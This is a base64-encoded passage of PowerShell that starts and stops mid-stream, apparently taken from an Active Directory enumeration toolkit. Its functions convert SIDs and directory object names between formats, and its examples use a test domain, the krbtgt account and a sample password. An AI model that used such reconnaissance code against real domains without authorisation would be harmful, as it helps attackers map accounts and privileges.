F0ZVBhdHRlcm4oJ15TLTEtLionKV0KICAgICAgICBbU3RyaW5nW11dCiAgICAgICAgJE9iamVjdFNpZCwKCiAgICAgICAgW1ZhbGlkYXRlTm90TnVsbE9yRW1wdHkoKV0KICAgICAgICBbU3RyaW5nXQogICAgICAgICREb21haW4sCgogICAgICAgIFtWYWxpZGF0ZU5vdE51bGxPckVtcHR5KCldCiAgICAgICAgW0FsaWFzKCdEb21haW5Db250cm9sbGVyJyldCiAgICAgICAgW1N0cmluZ10KICAgICAgICAkU2VydmVyLAoKICAgICAgICBbTWFuYWdlbWVudC5BdXRvbWF0aW9uLlBTQ3JlZGVudGlhbF0KICAgICAgICBbTWFuYWdlbWVudC5BdXRvbWF0aW9uLkNyZWRlbnRpYWxBdHRyaWJ1dGUoKV0KICAgICAgICAkQ3JlZGVudGlhbCA9IFtNYW5hZ2VtZW50LkF1dG9tYXRpb24uUFNDcmVkZW50aWFsXTo6RW1wdHkKICAgICkKCiAgICBCRUdJTiB7CiAgICAgICAgJEFETmFtZUFyZ3VtZW50cyA9IEB7fQogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ0RvbWFpbiddKSB7ICRBRE5hbWVBcmd1bWVudHNbJ0RvbWFpbiddID0gJERvbWFpbiB9CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snU2VydmVyJ10pIHsgJEFETmFtZUFyZ3VtZW50c1snU2VydmVyJ10gPSAkU2VydmVyIH0KICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydDcmVkZW50aWFsJ10pIHsgJEFETmFtZUFyZ3VtZW50c1snQ3JlZGVudGlhbCddID0gJENyZWRlbnRpYWwgfQogICAgfQoKICAgIFBST0NFU1MgewogICAgICAgIEZvckVhY2ggKCRUYXJnZXRTaWQgaW4gJE9iamVjdFNpZCkgewogICAgICAgICAgICAkVGFyZ2V0U2lkID0gJFRhcmdldFNpZC50cmltKCcqJykKICAgICAgICAgICAgdHJ5IHsKICAgICAgICAgICAgICAgICMgdHJ5IHRvIHJlc29sdmUgYW55IGJ1aWx0LWluIFNJRHMgZmlyc3QgLSBodHRwczovL3N1cHBvcnQubWljcm9zb2Z0LmNvbS9lbi11cy9rYi8yNDMzMzAKICAgICAgICAgICAgICAgIFN3aXRjaCAoJFRhcmdldFNpZCkgewogICAgICAgICAgICAgICAgICAgICdTLTEtMCcgICAgICAgICB7ICdOdWxsIEF1dGhvcml0eScgfQogICAgICAgICAgICAgICAgICAgICdTLTEtMC0wJyAgICAgICB7ICdOb2JvZHknIH0KICAgICAgICAgICAgICAgICAgICAnUy0xLTEnICAgICAgICAgeyAnV29ybGQgQXV0aG9yaXR5JyB9CiAgICAgICAgICAgICAgICAgICAgJ1MtMS0xLTAnICAgICAgIHsgJ0V2ZXJ5b25lJyB9CiAgICAgICAgICAgICAgICAgICAgJ1MtMS0yJyAgICAgICAgIHsgJ0xvY2FsIEF1dGhvcml0eScgfQogICAgICAgICAgICAgICAgICAgICdTLTEtMi0wJyAgICAgICB7ICdMb2NhbCcgfQogICAgICAgICAgICAgICAgICAgICdTLTEtMi0xJyAgICAgICB7ICdDb25zb2xlIExvZ29uICcgfQogICAgICAgICAgICAgICAgICAgICdTLTEtMycgICAgICAgICB7ICdDcmVhdG9yIEF1dGhvcml0eScgfQogICAgICAgICAgICAgICAgICAgICdTLTEtMy0wJyAgICAgICB7ICdDcmVhdG9yIE93bmVyJyB9CiAgICAgICAgICAgICAgICAgICAgJ1MtMS0zLTEnICAgICAgIHsgJ0NyZWF0b3IgR3JvdXAnIH0KICAgICAgICAgICAgICAgICAgICAnUy0xLTMtMicgICAgICAgeyAnQ3JlYXRvciBPd25lciBTZXJ2ZXInIH0KICAgICAgICAgICAgICAgICAgICAnUy0xLTMtMycgICAgICAgeyAnQ3JlYXRvciBHcm91cCBTZXJ2ZXInIH0KICAgICAgICAgICAgICAgICAgICAnUy0xLTMtNCcgICAgICAgeyAnT3duZXIgUmlnaHRzJyB9CiAgICAgICAgICAgICAgICAgICAgJ1MtMS00JyAgICAgICAgIHsgJ05vbi11bmlxdWUgQXV0aG9yaXR5JyB9CiAgICAgICAgICAgICAgICAgICAgJ1MtMS01JyAgICAgICAgIHsgJ05UIEF1dGhvcml0eScgfQogICAgICAgICAgICAgICAgICAgICdTLTEtNS0xJyAgICAgICB7ICdEaWFsdXAnIH0KICAgICAgICAgICAgICAgICAgICAnUy0xLTUtMicgICAgICAgeyAnTmV0d29yaycgfQogICAgICAgICAgICAgICAgICAgICdTLTEtNS0zJyAgICAgICB7ICdCYXRjaCcgfQogICAgICAgICAgICAgICAgICAgICdTLTEtNS00JyAgICAgICB7ICdJbnRlcmFjdGl2ZScgfQogICAgICAgICAgICAgICAgICAgICdTLTEtNS02JyAgICAgICB7ICdTZXJ2aWNlJyB9CiAgICAgICAgICAgICAgICAgICAgJ1MtMS01LTcnICAgICAgIHsgJ0Fub255bW91cycgfQogICAgICAgICAgICAgICAgICAgICdTLTEtNS04JyAgICAgICB7ICdQcm94eScgfQogICAgICAgICAgICAgICAgICAgICdTLTEtNS05JyAgICAgICB7ICdFbnRlcnByaXNlIERvbWFpbiBDb250cm9sbGVycycgfQogICAgICAgICAgICAgICAgICAgICdTLTEtNS0xMCcgICAgICB7ICdQcmluY2lwYWwgU2VsZicgfQogICAgICAgICAgICAgICAgICAgICdTLTEtNS0xMScgICAgICB7ICdBdXRoZW50aWNhdGVkIFVzZXJzJyB9CiAgICAgICAgICAgICAgICAgICAgJ1MtMS01LTEyJyAgICAgIHsgJ1Jlc3RyaWN0ZWQgQ29kZScgfQogICAgICAgICAgICAgICAgICAgICdTLTEtNS0xMycgICAgICB7ICdUZXJtaW5hbCBTZXJ2ZXIgVXNlcnMnIH0KICAgICAgICAgICAgICAgICAgICAnUy0xLTUtMTQnICAgICAgeyAnUmVtb3RlIEludGVyYWN0aXZlIExvZ29uJyB9CiAgICAgICAgICAgICAgICAgICAgJ1MtMS01LTE1JyAgICAgIHsgJ1RoaXMgT3JnYW5pemF0aW9uICcgfQogICAgICAgICAgICAgICAgICAgICdTLTEtNS0xNycgICAgICB7ICdUaGlzIE9yZ2FuaXphdGlvbiAnIH0KICAgICAgICAgICAgICAgICAgICAnUy0xLTUtMTgnICAgICAgeyAnTG9jYWwgU3lzdGVtJyB9CiAgICAgICAgICAgICAgICAgICAgJ1MtMS01LTE5JyAgICAgIHsgJ05UIEF1dGhvcml0eScgfQogICAgICAgICAgICAgICAgICAgICdTLTEtNS0yMCcgICAgICB7ICdOVCBBdXRob3JpdHknIH0KICAgICAgICAgICAgICAgICAgICAnUy0xLTUtODAtMCcgICAgeyAnQWxsIFNlcnZpY2VzICcgfQogICAgICAgICAgICAgICAgICAgICdTLTEtNS0zMi01NDQnICB7ICdCVUlMVElOXEFkbWluaXN0cmF0b3JzJyB9CiAgICAgICAgICAgICAgICAgICAgJ1MtMS01LTMyLTU0NScgIHsgJ0JVSUxUSU5cVXNlcnMnIH0KICAgICAgICAgICAgICAgICAgICAnUy0xLTUtMzItNTQ2JyAgeyAnQlVJTFRJTlxHdWVzdHMnIH0KICAgICAgICAgICAgICAgICAgICAnUy0xLTUtMzItNTQ3JyAgeyAnQlVJTFRJTlxQb3dlciBVc2VycycgfQogICAgICAgICAgICAgICAgICAgICdTLTEtNS0zMi01NDgnICB7ICdCVUlMVElOXEFjY291bnQgT3BlcmF0b3JzJyB9CiAgICAgICAgICAgICAgICAgICAgJ1MtMS01LTMyLTU0OScgIHsgJ0JVSUxUSU5cU2VydmVyIE9wZXJhdG9ycycgfQogICAgICAgICAgICAgICAgICAgICdTLTEtNS0zMi01NTAnICB7ICdCVUlMVElOXFByaW50IE9wZXJhdG9ycycgfQogICAgICAgICAgICAgICAgICAgICdTLTEtNS0zMi01NTEnICB7ICdCVUlMVElOXEJhY2t1cCBPcGVyYXRvcnMnIH0KICAgICAgICAgICAgICAgICAgICAnUy0xLTUtMzItNTUyJyAgeyAnQlVJTFRJTlxSZXBsaWNhdG9ycycgfQogICAgICAgICAgICAgICAgICAgICdTLTEtNS0zMi01NTQnICB7ICdCVUlMVElOXFByZS1XaW5kb3dzIDIwMDAgQ29tcGF0aWJsZSBBY2Nlc3MnIH0KICAgICAgICAgICAgICAgICAgICAnUy0xLTUtMzItNTU1JyAgeyAnQlVJTFRJTlxSZW1vdGUgRGVza3RvcCBVc2VycycgfQogICAgICAgICAgICAgICAgICAgICdTLTEtNS0zMi01NTYnICB7ICdCVUlMVElOXE5ldHdvcmsgQ29uZmlndXJhdGlvbiBPcGVyYXRvcnMnIH0KICAgICAgICAgICAgICAgICAgICAnUy0xLTUtMzItNTU3JyAgeyAnQlVJTFRJTlxJbmNvbWluZyBGb3Jlc3QgVHJ1c3QgQnVpbGRlcnMnIH0KICAgICAgICAgICAgICAgICAgICAnUy0xLTUtMzItNTU4JyAgeyAnQlVJTFRJTlxQZXJmb3JtYW5jZSBNb25pdG9yIFVzZXJzJyB9CiAgICAgICAgICAgICAgICAgICAgJ1MtMS01LTMyLTU1OScgIHsgJ0JVSUxUSU5cUGVyZm9ybWFuY2UgTG9nIFVzZXJzJyB9CiAgICAgICAgICAgICAgICAgICAgJ1MtMS01LTMyLTU2MCcgIHsgJ0JVSUxUSU5cV2luZG93cyBBdXRob3JpemF0aW9uIEFjY2VzcyBHcm91cCcgfQogICAgICAgICAgICAgICAgICAgICdTLTEtNS0zMi01NjEnICB7ICdCVUlMVElOXFRlcm1pbmFsIFNlcnZlciBMaWNlbnNlIFNlcnZlcnMnIH0KICAgICAgICAgICAgICAgICAgICAnUy0xLTUtMzItNTYyJyAgeyAnQlVJTFRJTlxEaXN0cmlidXRlZCBDT00gVXNlcnMnIH0KICAgICAgICAgICAgICAgICAgICAnUy0xLTUtMzItNTY5JyAgeyAnQlVJTFRJTlxDcnlwdG9ncmFwaGljIE9wZXJhdG9ycycgfQogICAgICAgICAgICAgICAgICAgICdTLTEtNS0zMi01NzMnICB7ICdCVUlMVElOXEV2ZW50IExvZyBSZWFkZXJzJyB9CiAgICAgICAgICAgICAgICAgICAgJ1MtMS01LTMyLTU3NCcgIHsgJ0JVSUxUSU5cQ2VydGlmaWNhdGUgU2VydmljZSBEQ09NIEFjY2VzcycgfQogICAgICAgICAgICAgICAgICAgICdTLTEtNS0zMi01NzUnICB7ICdCVUlMVElOXFJEUyBSZW1vdGUgQWNjZXNzIFNlcnZlcnMnIH0KICAgICAgICAgICAgICAgICAgICAnUy0xLTUtMzItNTc2JyAgeyAnQlVJTFRJTlxSRFMgRW5kcG9pbnQgU2VydmVycycgfQogICAgICAgICAgICAgICAgICAgICdTLTEtNS0zMi01NzcnICB7ICdCVUlMVElOXFJEUyBNYW5hZ2VtZW50IFNlcnZlcnMnIH0KICAgICAgICAgICAgICAgICAgICAnUy0xLTUtMzItNTc4JyAgeyAnQlVJTFRJTlxIeXBlci1WIEFkbWluaXN0cmF0b3JzJyB9CiAgICAgICAgICAgICAgICAgICAgJ1MtMS01LTMyLTU3OScgIHsgJ0JVSUxUSU5cQWNjZXNzIENvbnRyb2wgQXNzaXN0YW5jZSBPcGVyYXRvcnMnIH0KICAgICAgICAgICAgICAgICAgICAnUy0xLTUtMzItNTgwJyAgeyAnQlVJTFRJTlxBY2Nlc3MgQ29udHJvbCBBc3Npc3RhbmNlIE9wZXJhdG9ycycgfQogICAgICAgICAgICAgICAgICAgIERlZmF1bHQgewogICAgICAgICAgICAgICAgICAgICAgICBDb252ZXJ0LUFETmFtZSAtSWRlbnRpdHkgJFRhcmdldFNpZCBAQUROYW1lQXJndW1lbnRzCiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgfQogICAgICAgICAgICB9CiAgICAgICAgICAgIGNhdGNoIHsKICAgICAgICAgICAgICAgIFdyaXRlLVZlcmJvc2UgIltDb252ZXJ0RnJvbS1TSURdIEVycm9yIGNvbnZlcnRpbmcgU0lEICckVGFyZ2V0U2lkJyA6ICRfIgogICAgICAgICAgICB9CiAgICAgICAgfQogICAgfQp9CgoKZnVuY3Rpb24gQ29udmVydC1BRE5hbWUgewo8IwouU1lOT1BTSVMKCkNvbnZlcnRzIEFjdGl2ZSBEaXJlY3Rvcnkgb2JqZWN0IG5hbWVzIGJldHdlZW4gYSB2YXJpZXR5IG9mIGZvcm1hdHMuCgpBdXRob3I6IEJpbGwgU3Rld2FydCwgUGFzcXVhbGUgTGFudGVsbGEgIApNb2RpZmljYXRpb25zOiBXaWxsIFNjaHJvZWRlciAoQGhhcm1qMHkpICAKTGljZW5zZTogQlNEIDMtQ2xhdXNlICAKUmVxdWlyZWQgRGVwZW5kZW5jaWVzOiBOb25lICAKCi5ERVNDUklQVElPTgoKVGhpcyBmdW5jdGlvbiBpcyBoZWF2aWx5IGJhc2VkIG9uIEJpbGwgU3Rld2FydCdzIGNvZGUgYW5kIFBhc3F1YWxlIExhbnRlbGxhJ3MgY29kZSAoaW4gTElOSykKYW5kIHRyYW5zbGF0ZXMgQWN0aXZlIERpcmVjdG9yeSBuYW1lcyBiZXR3ZWVuIHZhcmlvdXMgZm9ybWF0cyB1c2luZyB0aGUgTmFtZVRyYW5zbGF0ZSBDT00gb2JqZWN0LgoKLlBBUkFNRVRFUiBJZGVudGl0eQoKU3BlY2lmaWVzIHRoZSBBY3RpdmUgRGlyZWN0b3J5IG9iamVjdCBuYW1lIHRvIHRyYW5zbGF0ZSwgb2YgdGhlIGZvbGxvd2luZyBmb3JtOgoKICAgIEROICAgICAgICAgICAgICAgIHNob3J0IGZvciAnZGlzdGluZ3Vpc2hlZCBuYW1lJzsgZS5nLiwgJ0NOPVBoaW5lYXMgRmx5bm4sT1U9RW5naW5lZXJzLERDPWZhYnJpa2FtLERDPWNvbScKICAgIENhbm9uaWNhbCAgICAgICAgIGNhbm9uaWNhbCBuYW1lOyBlLmcuLCAnZmFicmlrYW0uY29tL0VuZ2luZWVycy9QaGluZWFzIEZseW5uJwogICAgTlQ0ICAgICAgICAgICAgICAgZG9tYWluXHVzZXJuYW1lOyBlLmcuLCAnZmFicmlrYW1ccGZseW5uJwogICAgRGlzcGxheSAgICAgICAgICAgZGlzcGxheSBuYW1lLCBlLmcuICdwZmx5bm4nCiAgICBEb21haW5TaW1wbGUgICAgICBzaW1wbGUgZG9tYWluIG5hbWUgZm9ybWF0LCBlLmcuICdwZmx5bm5AZmFicmlrYW0uY29tJwogICAgRW50ZXJwcmlzZVNpbXBsZSAgc2ltcGxlIGVudGVycHJpc2UgbmFtZSBmb3JtYXQsIGUuZy4gJ3BmbHlubkBmYWJyaWthbS5jb20nCiAgICBHVUlEICAgICAgICAgICAgICBHVUlEOyBlLmcuLCAnezk1ZWU5ZmZmLTM0MzYtMTFkMS1iMmIwLWQxNWFlM2FjODQzNn0nCiAgICBVUE4gICAgICAgICAgICAgICB1c2VyIHByaW5jaXBhbCBuYW1lOyBlLmcuLCAncGZseW5uQGZhYnJpa2FtLmNvbScKICAgIENhbm9uaWNhbEV4ICAgICAgIGV4dGVuZGVkIGNhbm9uaWNhbCBuYW1lIGZvcm1hdAogICAgU1BOICAgICAgICAgICAgICAgc2VydmljZSBwcmluY2lwYWwgbmFtZSBmb3JtYXQ7IGUuZy4gJ0hUVFAva2Fpcm9tYWMuY29udG9zby5jb20nCiAgICBTSUQgICAgICAgICAgICAgICBTZWN1cml0eSBJZGVudGlmaWVyOyBlLmcuLCAnUy0xLTUtMjEtMTI5ODYyMzEtNjAwNjQxNTQ3LTcwOTEyMjI4OC01Nzk5OScKCi5QQVJBTUVURVIgT3V0cHV0VHlwZQoKU3BlY2lmaWVzIHRoZSBvdXRwdXQgbmFtZSB0eXBlIHlvdSB3YW50IHRvIGNvbnZlcnQgdG8sIHdoaWNoIG11c3QgYmUgb25lIG9mIHRoZSBmb2xsb3dpbmc6CgogICAgRE4gICAgICAgICAgICAgICAgc2hvcnQgZm9yICdkaXN0aW5ndWlzaGVkIG5hbWUnOyBlLmcuLCAnQ049UGhpbmVhcyBGbHlubixPVT1FbmdpbmVlcnMsREM9ZmFicmlrYW0sREM9Y29tJwogICAgQ2Fub25pY2FsICAgICAgICAgY2Fub25pY2FsIG5hbWU7IGUuZy4sICdmYWJyaWthbS5jb20vRW5naW5lZXJzL1BoaW5lYXMgRmx5bm4nCiAgICBOVDQgICAgICAgICAgICAgICBkb21haW5cdXNlcm5hbWU7IGUuZy4sICdmYWJyaWthbVxwZmx5bm4nCiAgICBEaXNwbGF5ICAgICAgICAgICBkaXNwbGF5IG5hbWUsIGUuZy4gJ3BmbHlubicKICAgIERvbWFpblNpbXBsZSAgICAgIHNpbXBsZSBkb21haW4gbmFtZSBmb3JtYXQsIGUuZy4gJ3BmbHlubkBmYWJyaWthbS5jb20nCiAgICBFbnRlcnByaXNlU2ltcGxlICBzaW1wbGUgZW50ZXJwcmlzZSBuYW1lIGZvcm1hdCwgZS5nLiAncGZseW5uQGZhYnJpa2FtLmNvbScKICAgIEdVSUQgICAgICAgICAgICAgIEdVSUQ7IGUuZy4sICd7OTVlZTlmZmYtMzQzNi0xMWQxLWIyYjAtZDE1YWUzYWM4NDM2fScKICAgIFVQTiAgICAgICAgICAgICAgIHVzZXIgcHJpbmNpcGFsIG5hbWU7IGUuZy4sICdwZmx5bm5AZmFicmlrYW0uY29tJwogICAgQ2Fub25pY2FsRXggICAgICAgZXh0ZW5kZWQgY2Fub25pY2FsIG5hbWUgZm9ybWF0LCBlLmcuICdmYWJyaWthbS5jb20vVXNlcnMvUGhpbmVhcyBGbHlubicKICAgIFNQTiAgICAgICAgICAgICAgIHNlcnZpY2UgcHJpbmNpcGFsIG5hbWUgZm9ybWF0OyBlLmcuICdIVFRQL2thaXJvbWFjLmNvbnRvc28uY29tJwoKLlBBUkFNRVRFUiBEb21haW4KClNwZWNpZmllcyB0aGUgZG9tYWluIHRvIHVzZSBmb3IgdGhlIHRyYW5zbGF0aW9uLCBkZWZhdWx0cyB0byB0aGUgY3VycmVudCBkb21haW4uCgouUEFSQU1FVEVSIFNlcnZlcgoKU3BlY2lmaWVzIGFuIEFjdGl2ZSBEaXJlY3Rvcnkgc2VydmVyIChkb21haW4gY29udHJvbGxlcikgdG8gYmluZCB0byBmb3IgdGhlIHRyYW5zbGF0aW9uLgoKLlBBUkFNRVRFUiBDcmVkZW50aWFsCgpTcGVjaWZpZXMgYW4gYWx0ZXJuYXRlIGNyZWRlbnRpYWwgdG8gdXNlIGZvciB0aGUgdHJhbnNsYXRpb24uCgouRVhBTVBMRQoKQ29udmVydC1BRE5hbWUgLUlkZW50aXR5ICJURVNUTEFCXGhhcm1qMHkiCgpoYXJtajB5QHRlc3RsYWIubG9jYWwKCi5FWEFNUExFCgoiVEVTVExBQlxrcmJ0Z3QiLCAiQ049QWRtaW5pc3RyYXRvcixDTj1Vc2VycyxEQz10ZXN0bGFiLERDPWxvY2FsIiB8IENvbnZlcnQtQUROYW1lIC1PdXRwdXRUeXBlIENhbm9uaWNhbAoKdGVzdGxhYi5sb2NhbC9Vc2Vycy9rcmJ0Z3QKdGVzdGxhYi5sb2NhbC9Vc2Vycy9BZG1pbmlzdHJhdG9yCgouRVhBTVBMRQoKQ29udmVydC1BRE5hbWUgLU91dHB1dFR5cGUgZG4gLUlkZW50aXR5ICdURVNUTEFCXGhhcm1qMHknIC1TZXJ2ZXIgUFJJTUFSWS50ZXN0bGFiLmxvY2FsCgpDTj1oYXJtajB5LENOPVVzZXJzLERDPXRlc3RsYWIsREM9bG9jYWwKCi5FWEFNUExFCgokU2VjUGFzc3dvcmQgPSBDb252ZXJ0VG8tU2VjdXJlU3RyaW5nICdQYXNzd29yZDEyMyEnIC1Bc1BsYWluVGV4dCAtRm9yY2UKJENyZWQgPSBOZXctT2JqZWN0IFN5c3RlbS5NYW5hZ2VtZW50LkF1dG9tYXRpb24uUFNDcmVkZW50aWFsKCdURVNUTEFCXGRmbScsICRTZWNQYXNzd29yZCkKJ1MtMS01LTIxLTg5MDE3MTg1OS0zNDMzODA5Mjc5LTMzNjYxOTY3NTMtMTEwOCcgfCBDb252ZXJ0LUFETkFtZSAtQ3JlZGVudGlhbCAkQ3JlZAoKVEVTVExBQlxoYXJtajB5CgouSU5QVVRTCgpTdHJpbmcKCkFjY2VwdHMgb25lIG9yIG1vcmUgb2JqZWN0cyBuYW1lIHN0cmluZ3Mgb24gdGhlIHBpcGVsaW5lLgoKLk9VVFBVVFMKClN0cmluZwoKT3V0cHV0cyBhIHN0cmluZyByZXByZXNlbnRpbmcgdGhlIGNvbnZlcnRlZCBuYW1lLgoKLkxJTksKCmh0dHA6Ly93aW5kb3dzaXRwcm8uY29tL2FjdGl2ZS1kaXJlY3RvcnkvdHJhbnNsYXRpbmctYWN0aXZlLWRpcmVjdG9yeS1vYmplY3QtbmFtZXMtYmV0d2Vlbi1mb3JtYXRzCmh0dHBzOi8vZ2FsbGVyeS50ZWNobmV0Lm1pY3Jvc29mdC5jb20vc2NyaXB0Y2VudGVyL1RyYW5zbGF0aW5nLUFjdGl2ZS01YzgwZGQ2NwojPgoKICAgIFtEaWFnbm9zdGljcy5Db2RlQW5hbHlzaXMuU3VwcHJlc3NNZXNzYWdlQXR0cmlidXRlKCdQU1VzZVNob3VsZFByb2Nlc3NGb3JTdGF0ZUNoYW5naW5nRnVuY3Rpb25zJywgJycpXQogICAgW091dHB1dFR5cGUoW1N0cmluZ10pXQogICAgW0NtZGxldEJpbmRpbmcoKV0KICAgIFBhcmFtKAogICAgICAgIFtQYXJhbWV0ZXIoTWFuZGF0b3J5ID0gJFRydWUsIFZhbHVlRnJvbVBpcGVsaW5lID0gJFRydWUsIFZhbHVlRnJvbVBpcGVsaW5lQnlQcm9wZXJ0eU5hbWUgPSAkVHJ1ZSldCiAgICAgICAgW0FsaWFzKCdOYW1lJywgJ09iamVjdE5hbWUnKV0KICAgICAgICBbU3RyaW5nW11dCiAgICAgICAgJElkZW50aXR5LAoKICAgICAgICBbU3RyaW5nXQogICAgICAgIFtWYWxpZGF0ZVNldCgnRE4nLCAnQ2Fub25pY2FsJywgJ05UNCcsICdEaXNwbGF5JywgJ0RvbWFpblNpbXBsZScsICdFbnRlcnByaXNlU2ltcGxlJywgJ0dVSUQnLCAnVW5rbm93bicsICdVUE4nLCAnQ2Fub25pY2FsRXgnLCAnU1BOJyldCiAgICAgICAgJE91dHB1dFR5cGUsCgogICAgICAgIFtWYWxpZGF0ZU5vdE51bGxPckVtcHR5KCldCiAgICAgICAgW1N0cmluZ10KICAgICAgICAkRG9tYWluLAoKICAgICAgICBbVmFsaWRhdGVOb3ROdWxsT3JFbXB0eSgpXQogICAgICAgIFtBbGlhcygnRG9tYWluQ29udHJvbGxlcicpXQogICAgICAgIFtTdHJpbmddCiAgICAgICAgJFNlcnZlciwKCiAgICAgICAgW01hbmFnZW1lbnQuQXV0b21hdGlvbi5QU0NyZWRlbnRpYWxdCiAgICAgICAgW01hbmFnZW1lbnQuQXV0b21hdGlvbi5DcmVkZW50aWFsQXR0cmlidXRlKCldCiAgICAgICAgJENyZWRlbnRpYWwgPSBbTWFuYWdlbWVudC5BdXRvbWF0aW9uLlBTQ3JlZGVudGlhbF06OkVtcHR5CiAgICApCgogICAgQkVHSU4gewogICAgICAgICROYW1lVHlwZXMgPSBAewogICAgICAgICAgICAnRE4nICAgICAgICAgICAgICAgID0gICAxICAjIENOPVBoaW5lYXMgRmx5bm4sT1U9RW5naW5lZXJzLERDPWZhYnJpa2FtLERDPWNvbQogICAgICAgICAgICAnQ2Fub25pY2FsJyAgICAgICAgID0gICAyICAjIGZhYnJpa2FtLmNvbS9FbmdpbmVlcnMvUGhpbmVhcyBGbHlubgogICAgICAgICAgICAnTlQ0JyAgICAgICAgICAgICAgID0gICAzICAjIGZhYnJpa2FtXHBmbHlubgogICAgICAgICAgICAnRGlzcGxheScgICAgICAgICAgID0gICA0ICAjIHBmbHlubgogICAgICAgICAgICAnRG9tYWluU2ltcGxlJyAgICAgID0gICA1ICAjIHBmbHlubkBmYWJyaWthbS5jb20KICAgICAgICAgICAgJ0VudGVycHJpc2VTaW1wbGUnICA9ICAgNiAgIyBwZmx5bm5AZmFicmlrYW0uY29tCiAgICAgICAgICAgICdHVUlEJyAgICAgICAgICAgICAgPSAgIDcgICMgezk1ZWU5ZmZmLTM0MzYtMTFkMS1iMmIwLWQxNWFlM2FjODQzNn0KICAgICAgICAgICAgJ1Vua25vd24nICAgICAgICAgICA9ICAgOCAgIyB1bmtub3duIHR5cGUgLSBsZXQgdGhlIHNlcnZlciBkbyB0cmFuc2xhdGlvbgogICAgICAgICAgICAnVVBOJyAgICAgICAgICAgICAgID0gICA5ICAjIHBmbHlubkBmYWJyaWthbS5jb20KICAgICAgICAgICAgJ0Nhbm9uaWNhbEV4JyAgICAgICA9ICAgMTAgIyBmYWJyaWthbS5jb20vVXNlcnMvUGhpbmVhcyBGbHlubgogICAgICAgICAgICAnU1BOJyAgICAgICAgICAgICAgID0gICAxMSAjIEhUVFAva2Fpcm9tYWMuY29udG9zby5jb20KICAgICAgICAgICAgJ1NJRCcgICAgICAgICAgICAgICA9ICAgMTIgIyBTLTEtNS0yMS0xMjk4NjIzMS02MDA2NDE1NDctNzA5MTIyMjg4LTU3OTk5CiAgICAgICAgfQoKICAgICAgICAjIGFjY2Vzc29yIGZ1bmN0aW9ucyBmcm9tIEJpbGwgU3Rld2FydCB0byBzaW1wbGlmeSBjYWxscyB0byBOYW1lVHJhbnNsYXRlCiAgICAgICAgZnVuY3Rpb24gSW52b2tlLU1ldGhvZChbX19Db21PYmplY3RdICRPYmplY3QsIFtTdHJpbmddICRNZXRob2QsICRQYXJhbWV0ZXJzKSB7CiAgICAgICAgICAgICRPdXRwdXQgPSAkTnVsbAogICAgICAgICAgICAkT3V0cHV0ID0gJE9iamVjdC5HZXRUeXBlKCkuSW52b2tlTWVtYmVyKCRNZXRob2QsICdJbnZva2VNZXRob2QnLCAkTlVMTCwgJE9iamVjdCwgJFBhcmFtZXRlcnMpCiAgICAgICAgICAgIFdyaXRlLU91dHB1dCAkT3V0cHV0CiAgICAgICAgfQoKICAgICAgICBmdW5jdGlvbiBHZXQtUHJvcGVydHkoW19fQ29tT2JqZWN0XSAkT2JqZWN0LCBbU3RyaW5nXSAkUHJvcGVydHkpIHsKICAgICAgICAgICAgJE9iamVjdC5HZXRUeXBlKCkuSW52b2tlTWVtYmVyKCRQcm9wZXJ0eSwgJ0dldFByb3BlcnR5JywgJE5VTEwsICRPYmplY3QsICROVUxMKQogICAgICAgIH0KCiAgICAgICAgZnVuY3Rpb24gU2V0LVByb3BlcnR5KFtfX0NvbU9iamVjdF0gJE9iamVjdCwgW1N0cmluZ10gJFByb3BlcnR5LCAkUGFyYW1ldGVycykgewogICAgICAgICAgICBbVm9pZF0gJE9iamVjdC5HZXRUeXBlKCkuSW52b2tlTWVtYmVyKCRQcm9wZXJ0eSwgJ1NldFByb3BlcnR5JywgJE5VTEwsICRPYmplY3QsICRQYXJhbWV0ZXJzKQogICAgICAgIH0KCiAgICAgICAgIyBodHRwczovL21zZG4ubWljcm9zb2Z0LmNvbS9lbi11cy9saWJyYXJ5L2FhNzcyMjY2JTI4dj12cy44NSUyOS5hc3B4CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snU2VydmVyJ10pIHsKICAgICAgICAgICAgJEFEU0luaXRUeXBlID0gMgogICAgICAgICAgICAkSW5pdE5hbWUgPSAkU2VydmVyCiAgICAgICAgfQogICAgICAgIGVsc2VpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydEb21haW4nXSkgewogICAgICAgICAgICAkQURTSW5pdFR5cGUgPSAxCiAgICAgICAgICAgICRJbml0TmFtZSA9ICREb21haW4KICAgICAgICB9CiAgICAgICAgZWxzZWlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ0NyZWRlbnRpYWwnXSkgewogICAgICAgICAgICAkQ3JlZCA9ICRDcmVkZW50aWFsLkdldE5ldHdvcmtDcmVkZW50aWFsKCkKICAgICAgICAgICAgJEFEU0luaXRUeXBlID0gMQogICAgICAgICAgICAkSW5pdE5hbWUgPSAkQ3JlZC5Eb21haW4KICAgICAgICB9CiAgICAgICAgZWxzZSB7CiAgICAgICAgICAgICMgaWYgbm8gZG9tYWluIG9yIHNlcnZlciBpcyBzcGVjaWZpZWQsIGRlZmF1bHQgdG8gR0MgaW5pdGlhbGl6YXRpb24KICAgICAgICAgICAgJEFEU0luaXRUeXBlID0gMwogICAgICAgICAgICAkSW5pdE5hbWUgPSAkTnVsbAogICAgICAgIH0KICAgIH0KCiAgICBQUk9DRVNTIHsKICAgICAgICBGb3JFYWNoICgkVGFyZ2V0SWRlbnRpdHkgaW4gJElkZW50aXR5KSB7CiAgICAgICAgICAgIGlmICgtbm90ICRQU0JvdW5kUGFyYW1ldGVyc1snT3V0cHV0VHlwZSddKSB7CiAgICAgICAgICAgICAgICBpZiAoJFRhcmdldElkZW50aXR5IC1tYXRjaCAiXltBLVphLXpdK1xcW0EtWmEteiBdKyIpIHsKICAgICAgICAgICAgICAgICAgICAkQURTT3V0cHV0VHlwZSA9ICROYW1lVHlwZXNbJ0RvbWFpblNpbXBsZSddCiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICBlbHNlIHsKICAgICAgICAgICAgICAgICAgICAkQURTT3V0cHV0VHlwZSA9ICROYW1lVHlwZXNbJ05UNCddCiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgIH0KICAgICAgICAgICAgZWxzZSB7CiAgICAgICAgICAgICAgICAkQURTT3V0cHV0VHlwZSA9ICROYW1lVHlwZXNbJE91dHB1dFR5cGVdCiAgICAgICAgICAgIH0KC